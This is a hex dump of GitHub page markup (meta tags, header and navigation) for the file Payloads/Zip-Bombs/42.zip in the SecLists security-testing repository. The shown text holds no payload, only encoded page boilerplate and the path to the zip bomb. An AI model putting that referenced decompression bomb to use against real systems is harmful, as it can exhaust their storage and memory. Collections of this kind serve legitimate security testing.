0000db0 6e61 6973 6e65 3e74 0a0a 2020 2020 2020
0000dc0 6d3c 7465 2061 616e 656d 223d 6f67 676f
0000dd0 656c 732d 7469 2d65 6576 6972 6966 6163
0000de0 6974 6e6f 2022 6f63 746e 6e65 3d74 4b22
0000df0 3554 7367 6838 7730 6176 6761 4b4c 5641
0000e00 7157 6238 6562 774e 5a6e 4b5a 7231 5831
0000e10 7951 5873 7833 7275 554c 3e22 200a 2020
0000e20 3c20 656d 6174 6e20 6d61 3d65 6722 6f6f
0000e30 6c67 2d65 6973 6574 762d 7265 6669 6369
0000e40 7461 6f69 226e 6320 6e6f 6574 746e 223d
0000e50 7a5a 5668 4579 7746 3762 3377 3065 752d
0000e60 544f 746c 386d 734a 6b63 4632 5335 5674
0000e70 6869 3044 7865 3277 7366 2241 0a3e 2020
0000e80 2020 6d3c 7465 2061 616e 656d 223d 6f67
0000e90 676f 656c 732d 7469 2d65 6576 6972 6966
0000ea0 6163 6974 6e6f 2022 6f63 746e 6e65 3d74
0000eb0 4722 7358 4b35 556f 6b55 434e 616f 5a41
0000ec0 376e 5077 2d4e 3074 5031 7779 3970 334d
0000ed0 4573 6e6a 5f74 5f33 575a 6350 3e22 0a0a
0000ee0 2020 6d3c 7465 2061 616e 656d 223d 636f
0000ef0 6f74 796c 6974 7363 682d 736f 2274 6320
0000f00 6e6f 6574 746e 223d 6f63 6c6c 6365 6f74
0000f10 2e72 6967 6874 6275 7061 2e70 6f63 226d
0000f20 2f20 3c3e 656d 6174 6e20 6d61 3d65 6f22
0000f30 7463 6c6f 7479 6369 2d73 7061 2d70 6469
0000f40 2022 6f63 746e 6e65 3d74 6722 7469 7568
0000f50 2262 2f20 3c3e 656d 6174 6e20 6d61 3d65
0000f60 6f22 7463 6c6f 7479 6369 2d73 7665 6e65
0000f70 2d74 7275 226c 6320 6e6f 6574 746e 223d
0000f80 7468 7074 3a73 2f2f 6f63 6c6c 6365 6f74
0000f90 2e72 6967 6874 6275 7061 2e70 6f63 2f6d
0000fa0 6967 6874 6275 652d 7478 7265 616e 2f6c
0000fb0 7262 776f 6573 5f72 7665 6e65 2274 2f20
0000fc0 3c3e 656d 6174 6e20 6d61 3d65 6f22 7463
0000fd0 6c6f 7479 6369 2d73 6964 656d 736e 6f69
0000fe0 2d6e 6572 7571 7365 5f74 6469 2022 6f63
0000ff0 746e 6e65 3d74 4322 3741 3a37 3837 3445
0001000 343a 3530 3130 3a31 4336 3631 3246 353a
0001010 4343 4543 3742 2246 2f20 3c3e 656d 6174
0001020 6e20 6d61 3d65 6f22 7463 6c6f 7479 6369
0001030 2d73 6964 656d 736e 6f69 2d6e 6572 6967
0001040 6e6f 655f 6764 2265 6320 6e6f 6574 746e
0001050 223d 6169 2264 2f20 3c3e 656d 6174 6e20
0001060 6d61 3d65 6f22 7463 6c6f 7479 6369 2d73
0001070 6964 656d 736e 6f69 2d6e 6572 6967 6e6f
0001080 725f 6e65 6564 2272 6320 6e6f 6574 746e
0001090 223d 6169 2264 2f20 0a3e 6d3c 7465 2061
00010a0 616e 656d 223d 6e61 6c61 7479 6369 2d73
00010b0 6f6c 6163 6974 6e6f 2022 6f63 746e 6e65
00010c0 3d74 2f22 6c26 3b74 7375 7265 6e2d 6d61
00010d0 2665 7467 2f3b 6c26 3b74 6572 6f70 6e2d
00010e0 6d61 2665 7467 2f3b 6c62 626f 732f 6f68
00010f0 2277 6420 7461 2d61 6a70 7861 742d 6172
0001100 736e 6569 746e 223d 7274 6575 2022 3e2f
0001110 0a0a 0a0a 2020 2020 6d3c 7465 2061 616e
0001120 656d 223d 6f67 676f 656c 612d 616e 796c
0001130 6974 7363 2022 6f63 746e 6e65 3d74 5522
0001140 2d41 3733 3936 3936 2d31 2232 0a3e 0a0a
0001150 6d3c 7465 2061 6c63 7361 3d73 6a22 2d73
0001160 6167 732d 7465 2022 616e 656d 223d 6964
0001170 656d 736e 6f69 316e 2022 6f63 746e 6e65
0001180 3d74 4c22 676f 6567 2064 754f 2274 0a3e
0001190 0a0a 200a 0a20 200a 2020 2020 3c20 656d
00011a0 6174 6e20 6d61 3d65 6822 736f 6e74 6d61
00011b0 2265 6320 6e6f 6574 746e 223d 6967 6874
00011c0 6275 632e 6d6f 3e22 200a 2020 3c20 656d
00011d0 6174 6e20 6d61 3d65 7522 6573 2d72 6f6c
00011e0 6967 226e 6320 6e6f 6574 746e 223d 3e22
00011f0 0a0a 2020 2020 2020 6d3c 7465 2061 616e
0001200 656d 223d 7865 6570 7463 6465 682d 736f
0001210 6e74 6d61 2265 6320 6e6f 6574 746e 223d
0001220 6967 6874 6275 632e 6d6f 3e22 200a 2020
0001230 3c20 656d 6174 6e20 6d61 3d65 6a22 2d73
0001240 7270 786f 2d79 6973 6574 642d 7465 6365
0001250 6974 6e6f 702d 7961 6f6c 6461 2022 6f63
0001260 746e 6e65 3d74 4e22 516a 5932 557a 5a35
0001270 4547 4f33 6b44 5a33 4654 5a6b 686a 5a6c
0001280 5a47 5968 5132 4d35 496a 4d77 5532 4d31
0001290 4d54 5a33 4947 4f78 4e57 4e6b 5254 596c
00012a0 4154 5a77 5a54 4d6a 4532 5931 567a 4d6d
00012b0 5232 4f6c 5954 5978 557a 4e79 7833 4937
00012c0 4a6e 626c 3957 5a30 3956 5a68 5247 5a79
00012d0 4e58 497a 6f6a 4d69 4d54 4c33 456a 4d78
00012e0 3469 4d79 597a 4d75 596a 4c69 4a43 5a79
00012f0 4658 5a31 4e58 5830 6c32 496b 6f6a 5169
0001300 4530 4e33 6f7a 4f33 5545 4f30 516a 4e77
0001310 4154 4d78 6f54 5132 457a 5232 496a 4e36
0001320 4e55 5144 5630 4e43 5930 4c69 4a43 6130
0001330 3157 636c 5233 6268 4158 4f69 456a 4e31
0001340 5954 4d35 4d7a 4d31 4d44 4973 686d 6376
0001350 5133 4f69 4a69 616e 5258 646f 4957 5975
0001360 3932 4974 306e 223d 0a3e 200a 2020 3c20
0001370 656d 6174 6e20 6d61 3d65 6522 616e 6c62
0001380 6465 662d 6165 7574 6572 2273 6320 6e6f
0001390 6574 746e 223d 4e55 5649 5245 4553 425f
00013a0 4e41 454e 2c52 414d 4b52 5445 4c50 4341
00013b0 5f45 4e49 4f56 4349 4445 425f 4c49 494c
00013c0 474e 4d2c 5241 454b 5054 414c 4543 535f
00013d0 434f 4149 5f4c 5250 4f4f 5f46 5543 5453
00013e0 4d4f 5245 2c53 414d 4b52 5445 4c50 4341
00013f0 5f45 5254 4e45 4944 474e 535f 434f 4149
0001400 5f4c 5250 4f4f 2c46 414d 4b52 5445 4c50
0001410 4341 5f45 4552 4f43 4d4d 4e45 4144 4954
0001420 4e4f 2253 0a3e 200a 3c20 656d 6174 6e20
0001430 6d61 3d65 6822 6d74 2d6c 6173 6566 6e2d
0001440 6e6f 6563 2022 6f63 746e 6e65 3d74 3522
0001450 3635 3664 6638 6238 6238 6531 3430 6436
0001460 3436 3432 3235 6530 3131 3633 3434 3039
0001470 6462 3138 3636 2266 0a3e 200a 3c20 656d
0001480 6174 6820 7474 2d70 7165 6975 3d76 7822
0001490 702d 616a 2d78 6576 7372 6f69 226e 6320
00014a0 6e6f 6574 746e 223d 3838 6563 6462 3566
00014b0 6530 6638 3863 3034 3764 3738 6536 3339
00014c0 3737 6231 3163 3838 3e22 200a 0a20 200a
00014d0 2020 2020 3c20 696c 6b6e 6820 6572 3d66
00014e0 6822 7474 7370 2f3a 672f 7469 7568 2e62
00014f0 6f63 2f6d 6164 696e 6c65 696d 7365 6c73
0001500 7265 532f 6365 694c 7473 2f73 6f63 6d6d
0001510 7469 2f73 616d 7473 7265 612e 6f74 226d
0001520 7220 6c65 223d 6c61 6574 6e72 7461 2265
0001530 7420 7469 656c 223d 6552 6563 746e 4320
0001540 6d6f 696d 7374 7420 206f 6553 4c63 7369
0001550 7374 6d3a 7361 6574 2272 7420 7079 3d65
0001560 6122 7070 696c 6163 6974 6e6f 612f 6f74
0001570 2b6d 6d78 226c 0a3e 200a 3c20 656d 6174
0001580 6e20 6d61 3d65 6722 2d6f 6d69 6f70 7472
0001590 2022 6f63 746e 6e65 3d74 6722 7469 7568
00015a0 2e62 6f63 2f6d 6164 696e 6c65 696d 7365
00015b0 6c73 7265 532f 6365 694c 7473 2073 6967
00015c0 2074 7468 7074 3a73 2f2f 6967 6874 6275
00015d0 632e 6d6f 642f 6e61 6569 6d6c 6569 7373
00015e0 656c 2f72 6553 4c63 7369 7374 672e 7469
00015f0 3e22 0a0a 2020 6d3c 7465 2061 616e 656d
0001600 223d 636f 6f74 796c 6974 7363 642d 6d69
0001610 6e65 6973 6e6f 752d 6573 5f72 6469 2022
0001620 6f63 746e 6e65 3d74 3522 3630 3435 2022
0001630 3e2f 6d3c 7465 2061 616e 656d 223d 636f
0001640 6f74 796c 6974 7363 642d 6d69 6e65 6973
0001650 6e6f 752d 6573 5f72 6f6c 6967 226e 6320
0001660 6e6f 6574 746e 223d 6164 696e 6c65 696d
0001670 7365 6c73 7265 2022 3e2f 6d3c 7465 2061
0001680 616e 656d 223d 636f 6f74 796c 6974 7363
0001690 642d 6d69 6e65 6973 6e6f 722d 7065 736f
00016a0 7469 726f 5f79 6469 2022 6f63 746e 6e65
00016b0 3d74 3322 3834 3532 3838 2022 3e2f 6d3c
00016c0 7465 2061 616e 656d 223d 636f 6f74 796c
00016d0 6974 7363 642d 6d69 6e65 6973 6e6f 722d
00016e0 7065 736f 7469 726f 5f79 776e 226f 6320
00016f0 6e6f 6574 746e 223d 6164 696e 6c65 696d
0001700 7365 6c73 7265 532f 6365 694c 7473 2273
0001710 2f20 3c3e 656d 6174 6e20 6d61 3d65 6f22
0001720 7463 6c6f 7479 6369 2d73 6964 656d 736e
0001730 6f69 2d6e 6572 6f70 6973 6f74 7972 705f
0001740 6275 696c 2263 6320 6e6f 6574 746e 223d
0001750 7274 6575 2022 3e2f 6d3c 7465 2061 616e
0001760 656d 223d 636f 6f74 796c 6974 7363 642d
0001770 6d69 6e65 6973 6e6f 722d 7065 736f 7469
0001780 726f 5f79 7369 665f 726f 226b 6320 6e6f
0001790 6574 746e 223d 6166 736c 2265 2f20 3c3e
00017a0 656d 6174 6e20 6d61 3d65 6f22 7463 6c6f
00017b0 7479 6369 2d73 6964 656d 736e 6f69 2d6e
00017c0 6572 6f70 6973 6f74 7972 6e5f 7465 6f77
00017d0 6b72 725f 6f6f 5f74 6469 2022 6f63 746e
00017e0 6e65 3d74 3322 3834 3532 3838 2022 3e2f
00017f0 6d3c 7465 2061 616e 656d 223d 636f 6f74
0001800 796c 6974 7363 642d 6d69 6e65 6973 6e6f
0001810 722d 7065 736f 7469 726f 5f79 656e 7774
0001820 726f 5f6b 6f72 746f 6e5f 6f77 2022 6f63
0001830 746e 6e65 3d74 6422 6e61 6569 6d6c 6569
0001840 7373 656c 2f72 6553 4c63 7369 7374 2022
0001850 3e2f 6d3c 7465 2061 616e 656d 223d 636f
0001860 6f74 796c 6974 7363 642d 6d69 6e65 6973
0001870 6e6f 722d 7065 736f 7469 726f 5f79 7865
0001880 6c70 726f 5f65 6967 6874 6275 6d5f 7261
0001890 656b 7074 616c 6563 635f 5f69 7463 5f61
00018a0 6873 776f 226e 6320 6e6f 6574 746e 223d
00018b0 6166 736c 2265 2f20 0a3e 0a0a 2020 2020
00018c0 6c3c 6e69 206b 6572 3d6c 6322 6e61 6e6f
00018d0 6369 6c61 2022 7268 6665 223d 7468 7074
00018e0 3a73 2f2f 6967 6874 6275 632e 6d6f 642f
00018f0 6e61 6569 6d6c 6569 7373 656c 2f72 6553
0001900 4c63 7369 7374 622f 6f6c 2f62 616d 7473
0001910 7265 502f 7961 6f6c 6461 2f73 695a 2d70
0001920 6f42 626d 2f73 3234 7a2e 7069 2022 6164
0001930 6174 702d 616a 2d78 7274 6e61 6973 6e65
0001940 3e74 0a0a 200a 3c20 656d 6174 6e20 6d61
0001950 3d65 6222 6f72 7377 7265 732d 6174 7374
0001960 752d 6c72 2022 6f63 746e 6e65 3d74 6822
0001970 7474 7370 2f3a 612f 6970 672e 7469 7568
0001980 2e62 6f63 2f6d 705f 6972 6176 6574 622f
0001990 6f72 7377 7265 732f 6174 7374 3e22 0a0a
00019a0 2020 6d3c 7465 2061 616e 656d 223d 7262
00019b0 776f 6573 2d72 7265 6f72 7372 752d 6c72
00019c0 2022 6f63 746e 6e65 3d74 6822 7474 7370
00019d0 2f3a 612f 6970 672e 7469 7568 2e62 6f63
00019e0 2f6d 705f 6972 6176 6574 622f 6f72 7377
00019f0 7265 652f 7272 726f 2273 0a3e 200a 3c20
0001a00 696c 6b6e 7220 6c65 223d 616d 6b73 692d
0001a10 6f63 226e 6820 6572 3d66 6822 7474 7370
0001a20 2f3a 672f 7469 7568 2e62 6967 6874 6275
0001a30 7361 6573 7374 632e 6d6f 702f 6e69 656e
0001a40 2d64 636f 6f74 6163 2e74 7673 2267 6320
0001a50 6c6f 726f 223d 3023 3030 3030 2230 0a3e
0001a60 2020 6c3c 6e69 206b 6572 3d6c 6922 6f63
0001a70 226e 7420 7079 3d65 6922 616d 6567 782f
0001a80 692d 6f63 226e 6320 616c 7373 223d 736a
0001a90 732d 7469 2d65 6166 6976 6f63 226e 6820
0001aa0 6572 3d66 6822 7474 7370 2f3a 672f 7469
0001ab0 7568 2e62 6967 6874 6275 7361 6573 7374
0001ac0 632e 6d6f 662f 7661 6369 6e6f 692e 6f63
0001ad0 3e22 0a0a 6d3c 7465 2061 616e 656d 223d
0001ae0 6874 6d65 2d65 6f63 6f6c 2272 6320 6e6f
0001af0 6574 746e 223d 3123 3265 3233 2237 0a3e
0001b00 0a0a 0a0a 200a 3c20 696c 6b6e 7220 6c65
0001b10 223d 616d 696e 6566 7473 2022 7268 6665
0001b20 223d 6d2f 6e61 6669 7365 2e74 736a 6e6f
0001b30 2022 7263 736f 4f73 6972 6967 3d6e 7522
0001b40 6573 632d 6572 6564 746e 6169 736c 3e22
0001b50 0a0a 2020 2f3c 6568 6461 0a3e 200a 3c20
0001b60 6f62 7964 6320 616c 7373 223d 6f6c 6767
0001b70 6465 6f2d 7475 6520 766e 702d 6f72 7564
0001b80 7463 6f69 206e 6170 6567 622d 6f6c 2262
0001b90 0a3e 2020 2020 0a0a 2020 643c 7669 6320
0001ba0 616c 7373 223d 6f70 6973 6974 6e6f 722d
0001bb0 6c65 7461 7669 2065 736a 682d 6165 6564
0001bc0 2d72 7277 7061 6570 2072 3e22 200a 2020
0001bd0 3c20 2061 7268 6665 223d 7323 6174 7472
0001be0 6f2d 2d66 6f63 746e 6e65 2274 7420 6261
0001bf0 6e69 6564 3d78 3122 2022 6c63 7361 3d73
0001c00 7022 2d78 2032 7970 342d 6220 2d67 6c62
0001c10 6575 7420 7865 2d74 6877 7469 2065 6873
0001c20 776f 6f2d 2d6e 6f66 7563 2073 736a 732d
0001c30 696b 2d70 6f74 632d 6e6f 6574 746e 3e22
0001c40 6b53 7069 7420 206f 6f63 746e 6e65 3c74
0001c50 612f 0a3e 2020 2020 643c 7669 6920 3d64
0001c60 6a22 2d73 6a70 7861 6c2d 616f 6564 2d72
0001c70 6162 2272 6320 616c 7373 223d 6a70 7861
0001c80 6c2d 616f 6564 2d72 6162 2272 3c3e 6964
0001c90 2076 6c63 7361 3d73 7022 6f72 7267 7365
0001ca0 2273 3c3e 642f 7669 3c3e 642f 7669 0a3e
0001cb0 200a 2020 0a20 2020 2020 200a 2020 0a20
0001cc0 0a0a 2020 2020 2020 2020 683c 6165 6564
0001cd0 2072 6c63 7361 3d73 4822 6165 6564 2d72
0001ce0 6c6f 2064 6568 6461 7265 6c2d 676f 6567
0001cf0 2d64 756f 2074 7020 736f 7469 6f69 2d6e
0001d00 6572 616c 6974 6576 6620 2034 7970 322d
0001d10 2022 6f72 656c 223d 6162 6e6e 7265 3e22
0001d20 200a 3c20 6964 2076 6c63 7361 3d73 6322
0001d30 6e6f 6174 6e69 7265 6c2d 2067 2d64 6c66
0001d40 7865 7020 2d78 2233 0a3e 2020 2020 643c
0001d50 7669 6320 616c 7373 223d 2d64 6c66 7865
0001d60 6620 656c 2d78 756a 7473 6669 2d79 6562
0001d70 7774 6565 206e 6c66 7865 692d 6574 736d
0001d80 632d 6e65 6574 2272 0a3e 2020 2020 2020
0001d90 2020 613c 6320 616c 7373 223d 726d 342d
0001da0 2022 7268 6665 223d 7468 7074 3a73 2f2f
0001db0 6967 6874 6275 632e 6d6f 222f 6120 6972
0001dc0 2d61 616c 6562 3d6c 4822 6d6f 7065 6761
0001dd0 2265 6420 7461 2d61 6167 632d 696c 6b63
0001de0 223d 4c28 676f 6567 2064 756f 2974 4820
0001df0 6165 6564 2c72 6720 206f 6f74 6820 6d6f
0001e00 7065 6761 2c65 6920 6f63 3a6e 6f6c 6f67
0001e10 772d 726f 6d64 7261 226b 0a3e 2020 2020
0001e20 2020 2020 2020 733c 6776 6820 6965 6867
0001e30 3d74 3322 2232 6320 616c 7373 223d 636f
0001e40 6974 6f63 206e 636f 6974 6f63 2d6e 616d
0001e50 6b72 672d 7469 7568 2062 6574 7478 772d
0001e60 6968 6574 2022 6976 7765 6f42 3d78 3022
0001e70 3020 3120 2036 3631 2022 6576 7372 6f69
0001e80 3d6e 3122 312e 2022 6977 7464 3d68 3322
0001e90 2232 6120 6972 2d61 6968 6464 6e65 223d
0001ea0 7274 6575 3e22 703c 7461 2068 6966 6c6c
0001eb0 722d 6c75 3d65 6522 6576 6f6e 6464 2022
0001ec0 3d64 4d22 2038 4330 2e33 3835 3020 3020
0001ed0 3320 352e 2038 2030 6338 2030 2e33 3435
0001ee0 3220 322e 2039 2e36 3335 3520 342e 2037
0001ef0 2e37 3935 342e 302e 2e37 3535 2e2d 3731
0001f00 352e 2d35 332e 2038 2d30 312e 2d39 302e
0001f10 2d31 382e 2d32 302e 2d31 2e31 3934 322d
0001f20 302e 2e31 3733 322d 352e 2d33 342e 2d39
0001f30 2e32 3936 2e2d 3439 2e2d 3930 2e2d 3332
0001f40 2e2d 3834 2e2d 3439 2e2d 3238 312d 312e
0001f50 2d33 322e 2d38 312e 2d35 362e 2d38 352e
0001f60 2d32 302e 2d31 352e 2e33 3336 2e2d 3130
0001f70 3120 302e 2e38 3835 3120 322e 2e33 3238
0001f80 372e 2032 2e31 3132 3120 382e 2e37 3738
0001f90 3220 332e 2e33 3636 302e 2d37 352e 2e32
0001fa0 3832 2e2d 3738 352e 2d31 2e31 3730 312d
0001fb0 372e 2d38 322e 332d 362e 2d34 382e 2d39
0001fc0 2e33 3436 332d 392e 2035 2d30 382e 2e37
0001fd0 3133 312d 352e 2e39 3238 322d 312e 2d35
0001fe0 302e 2d38 322e 2e2d 3633 312d 302e 2e32
0001ff0 3830 322d 312e 2032 2030 2030 362e 2d37
0002000 322e 2031 2e32 2e32 3238 362e 2d34 312e
0002010 2038 2e31 3233 2e2d 3732 3220 2e2d 3732
0002020 362e 2038 2030 2e31 3633 302e 2039 2032
0002030 322e 2037 2e31 3335 312d 302e 2034 2e32
0002040 2d32 382e 2032 2e32 2d32 382e 2e32 3434
0002050 3120 312e 312e 2036 2e31 3239 302e 2038
0002060 2e32 3231 352e 2e31 3635 382e 2032 2e31
0002070 3732 382e 2032 2e32 3531 3020 3320 302e
0002080 2d37 2e31 3738 3320 372e 2d35 2e33 3536
0002090 3320 392e 2e35 3932 322e 2e35 3435 372e
00020a0 2e33 3435 3120 342e 2038 2030 2e31 3730
00020b0 2e2d 3130 3120 392e 2d33 302e 2031 2e32
00020c0 2032 2030 322e 2e31 3531 342e 2e36 3535
00020d0 332e 4138 2e38 3130 2033 2e38 3130 2033
00020e0 2030 2030 2030 3631 3820 3063 342d 342e
00020f0 2d32 2e33 3835 382d 382d 382d 227a 3e2f
0002100 2f3c 7673 3e67 200a 2020 2020 2020 3c20
0002110 612f 0a3e 2020 2020 2f3c 6964 3e76 0a0a
0002120 2020 2020 643c 7669 6320 616c 7373 223d
0002130 6548 6461 7265 654d 756e 4820 6165 6564
0002140 4d72 6e65 2d75 6c2d 676f 6567 2d64 756f
0002150 2074 2d64 6c66 7865 6620 656c 2d78 756a
0002160 7473 6669 2d79 6562 7774 6565 206e 6c66
0002170 7865 692d 6574 736d 632d 6e65 6574 2072
0002180 6c66 7865 612d 7475 226f 0a3e 2020 2020
0002190 2020 643c 7669 6320 616c 7373 223d 2d64
00021a0 6f6e 656e 3e22 200a 2020 2020 2020 3c20
00021b0 7562 7474 6e6f 6320 616c 7373 223d 7462
00021c0 2d6e 696c 6b6e 6a20 2d73 6564 6174 6c69
00021d0 2d73 6174 6772 7465 2022 7974 6570 223d
00021e0 7562 7474 6e6f 2022 7261 6169 6c2d 6261
00021f0 6c65 223d 6f54 6767 656c 6e20 7661 6769
0002200 7461 6f69 226e 6120 6972 2d61 7865 6170
0002210 646e 6465 223d 6166 736c 2265 0a3e 2020
0002220 2020 2020 2020 2020 733c 6776 6820 6965
0002230 6867 3d74 3222 2234 6320 616c 7373 223d
0002240 636f 6974 6f63 206e 636f 6974 6f63 2d6e
0002250 2078 6574 7478 672d 6172 2279 7620 6569
0002260 4277 786f 223d 2030 2030 3231 3120 2236
0002270 7620 7265 6973 6e6f 223d 2e31 2231 7720
0002280 6469 6874 223d 3831 2022 7261 6169 682d
0002290 6469 6564 3d6e 7422 7572 2265 3c3e 6170
00022a0 6874 6620 6c69 2d6c 7572 656c 223d 7665
00022b0 6e65 646f 2264 6420 223d 374d 342e 2038
00022c0 6c38 2e33 3537 3320 372e 2d35 2e31 3834
00022d0 3120 342e 4c38 2036 2e39 3834 2d6c 2e33
00022e0 3537 3320 372e 2d35 2e31 3834 312d 342e
00022f0 4c38 2e34 3235 3820 2e20 3737 3420 322e
0002300 6c35 2e31 3834 312d 342e 4c38 2036 2e36
0002310 3235 336c 372e 2d35 2e33 3537 3120 342e
0002320 2038 2e31 3834 374c 342e 2038 7a38 2f22
0002330 3c3e 732f 6776 0a3e 2020 2020 2020 2020
0002340 2f3c 7562 7474 6e6f 0a3e 2020 2020 2020
0002350 2f3c 6964 3e76 0a0a 2020 2020 2020 2020
0002360 6e3c 7661 6320 616c 7373 223d 746d 302d
0002370 2022 7261 6169 6c2d 6261 6c65 223d 6c47
0002380 626f 6c61 3e22 200a 2020 2020 2020 2020
0002390 3c20 6c75 6320 616c 7373 223d 2d64 6c66
00023a0 7865 6c20 7369 2d74 7473 6c79 2d65 6f6e
00023b0 656e 3e22 200a 2020 2020 2020 2020 2020
00023c0 2020 3c20 696c 6320 616c 7373 223d 6d20
00023d0 2d72 2033 726d 6c2d 2d67 2033 6465 6567
00023e0 692d 6574 2d6d 6966 2078 6f70 6973 6974
00023f0 6e6f 722d 6c65 7461 7669 2065 6c66 7865
0002400 772d 6172 2070 6c66 7865 6a2d 7375 6974
0002410 7966 622d 7465 6577 6e65 6420 662d 656c
0002420 2078 6c66 7865 692d 6574 736d 632d 6e65
0002430 6574 2072 3e22 200a 2020 2020 2020 2020
0002440 2020 2020 2020 3c20 6564 6174 6c69 2073
0002450 6c63 7361 3d73 4822 6165 6564 4d72 6e65
0002460 2d75 6564 6174 6c69 2073 6564 6174 6c69
0002470 2d73 766f 7265 616c 2079 6564 6174 6c69
0002480 2d73 6572 6573 2074 6977 7464 2d68 7566
0002490 6c6c 3e22 200a 2020 2020 2020 2020 2020
00024a0 2020 2020 2020 3c20 7573 6d6d 7261 2079
00024b0 6c63 7361 3d73 4822 6165 6564 4d72 6e65
00024c0 2d75 7573 6d6d 7261 2079 6548 6461 7265
00024d0 654d 756e 6c2d 6e69 206b 7870 302d 7020
00024e0 2d79 2033 6f62 6472 7265 302d 6e20 2d6f
00024f0 7277 7061 2020 2d64 6e69 696c 656e 622d
0002500 6f6c 6b63 3e22 200a 2020 2020 2020 2020
0002510 2020 2020 2020 2020 2020 5720 7968 4720
0002520 7469 7548 3f62 200a 2020 2020 2020 2020
0002530 2020 2020 2020 2020 2020 3c20 7673 2067
0002540 3d78 3022 7870 2022 3d79 3022 7870 2022
0002550 6976 7765 6f42 3d78 3022 3020 3120 2034
0002560 2238 7820 6c6d 733a 6170 6563 223d 7270
0002570 7365 7265 6576 2022 6966 6c6c 223d 6f6e
0002580 656e 2022 6c63 7361 3d73 6922 6f63 2d6e
0002590 6863 7665 6e6f 642d 776f 2d6e 6b6d 6774
00025a0 7020 736f 7469 6f69 2d6e 6572 616c 6974
00025b0 6576 3e22 200a 2020 2020 2020 2020 2020
00025c0 2020 2020 2020 2020 2020 3c20 6170 6874
00025d0 6420 223d 314d 312c 366c 322e 362c 314c
00025e0 2c33 2231 3c3e 702f 7461 3e68 200a 2020
00025f0 2020 2020 2020 2020 2020 2020 2020 2020
0002600 3c20 732f 6776 0a3e 2020 2020 2020 2020
0002610 2020 2020 2020 2020 2020 2f3c 7573 6d6d
0002620 7261 3e79 200a 2020 2020 2020 2020 2020
0002630 2020 2020 2020 3c20 6964 2076 6c63 7361
0002640 3d73 6422 6f72 6470 776f 2d6e 656d 756e
0002650 6620 656c 2d78 7561 6f74 7220 756f 646e
0002660 6465 312d 6220 2d67 6877 7469 2065 7870
0002670 302d 6d20 2d74 2030 7020 342d 6c20 6665
0002680 2d74 346e 7020 736f 7469 6f69 2d6e 6261
0002690 6f73 756c 6574 3e22 200a 2020 2020 2020
00026a0 2020 2020 2020 2020 2020 2020 3c20 2061
00026b0 7268 6665 223d 662f 6165 7574 6572 2273
00026c0 6320 616c 7373 223d 7970 322d 6c20 2d68
00026d0 6f63 646e 6e65 6573 2d64 6c75 7274 2061
00026e0 2d64 6c62 636f 206b 696c 6b6e 672d 6172
00026f0 2d79 6164 6b72 6e20 2d6f 6e75 6564 6c72
0002700 6e69 2065 3568 4220 6d75 2d70 696c 6b6e
0002710 2d2d 6f68 6576 2272 6420 7461 2d61 6167
0002720 632d 696c 6b63 223d 4c28 676f 6567 2064
0002730 756f 2974 4820 6165 6564 2c72 6720 206f
0002740 6f74 4620 6165 7574 6572 2273 463e 6165
0002750 7574 6572 2073 733c 6170 206e 6c63 7361
0002760 3d73 4222 6d75 2d70 696c 6b6e 732d 6d79
0002770 6f62 206c 6c66 616f 2d74 6972 6867 2074
0002780 6574 7478 6e2d 726f 616d 206c 6574 7478
0002790 672d 6172 2d79 696c 6867 2274 263e 6172
00027a0 7272 3c3b 732f 6170 3e6e 2f3c 3e61 200a
00027b0 2020 2020 2020 2020 2020 2020 2020 2020
00027c0 2020 3c20 6c75 6320 616c 7373 223d 696c
00027d0 7473 732d 7974 656c 6e2d 6e6f 2065 3566
00027e0 7020 2d62 2233 0a3e 2020 2020 2020 2020
00027f0 2020 2020 2020 2020 2020 2020 2020 6c3c
0002800 2069 6c63 7361 3d73 6522 6764 2d65 7469
0002810 6d65 662d 7869 3e22 613c 6820 6572 3d66
0002820 2f22 6566 7461 7275 7365 632f 646f 2d65
0002830 6572 6976 7765 222f 6320 616c 7373 223d
0002840 7970 322d 6c20 2d68 6f63 646e 6e65 6573
0002850 2d64 6c75 7274 2061 2d64 6c62 636f 206b
0002860 696c 6b6e 672d 6172 2079 6f6e 752d 646e
0002870 7265 696c 656e 6620 2235 6420 7461 2d61
0002880 6167 632d 696c 6b63 223d 4c28 676f 6567
0002890 2064 756f 2974 4820 6165 6564 2c72 6720
00028a0 206f 6f74 4320 646f 2065 6572 6976 7765
00028b0 3e22 6f43 6564 7220 7665 6569 3c77 612f
00028c0 3c3e 6c2f 3e69 200a 2020 2020 2020 2020
00028d0 2020 2020 2020 2020 2020 2020 3c20 696c
00028e0 6320 616c 7373 223d 6465 6567 692d 6574
00028f0 2d6d 6966 2278 3c3e 2061 7268 6665 223d
0002900 662f 6165 7574 6572 2f73 7270 6a6f 6365
0002910 2d74 616d 616e 6567 656d 746e 222f 6320
0002920 616c 7373 223d 7970 322d 6c20 2d68 6f63
0002930 646e 6e65 6573 2d64 6c75 7274 2061 2d64
0002940 6c62 636f 206b 696c 6b6e 672d 6172 2079
0002950 6f6e 752d 646e 7265 696c 656e 6620 2235
0002960 6420 7461 2d61 6167 632d 696c 6b63 223d
0002970 4c28 676f 6567 2064 756f 2974 4820 6165
0002980 6564 2c72 6720 206f 6f74 5020 6f72 656a
0002990 7463 6d20 6e61 6761 6d65 6e65 2274 503e
00029a0 6f72 656a 7463 6d20 6e61 6761 6d65 6e65
00029b0 3c74 612f 3c3e 6c2f 3e69 200a 2020 2020
00029c0 2020 2020 2020 2020 2020 2020 2020 2020
00029d0 3c20 696c 6320 616c 7373 223d 6465 6567
00029e0 692d 6574 2d6d 6966 2278 3c3e 2061 7268
00029f0 6665 223d 662f 6165 7574 6572 2f73 6e69
0002a00 6574 7267 7461 6f69 736e 2022 6c63 7361
0002a10 3d73 7022 2d79 2032 686c 632d 6e6f 6564
0002a20 736e 6465 752d 746c 6172 6420 622d 6f6c
0002a30 6b63 6c20 6e69 2d6b 7267 7961 6e20 2d6f
0002a40 6e75 6564 6c72 6e69 2065 3566 2022 6164
0002a50 6174 672d 2d61 6c63 6369 3d6b 2822 6f4c
0002a60 6767 6465 6f20 7475 2029 6548 6461 7265
0002a70 202c 6f67 7420 206f 6e49 6574 7267 7461
0002a80 6f69 736e 3e22 6e49 6574 7267 7461 6f69
0002a90 736e 2f3c 3e61 2f3c 696c 0a3e 2020 2020
0002aa0 2020 2020 2020 2020 2020 2020 2020 2020
0002ab0 2020 6c3c 2069 6c63 7361 3d73 6522 6764
0002ac0 2d65 7469 6d65 662d 7869 3e22 613c 6820
0002ad0 6572 3d66 2f22 6566 7461 7275 7365 612f
0002ae0 7463 6f69 736e 2022 6c63 7361 3d73 7022
0002af0 2d79 2032 686c 632d 6e6f 6564 736e 6465
0002b00 752d 746c 6172 6420 622d 6f6c 6b63 6c20
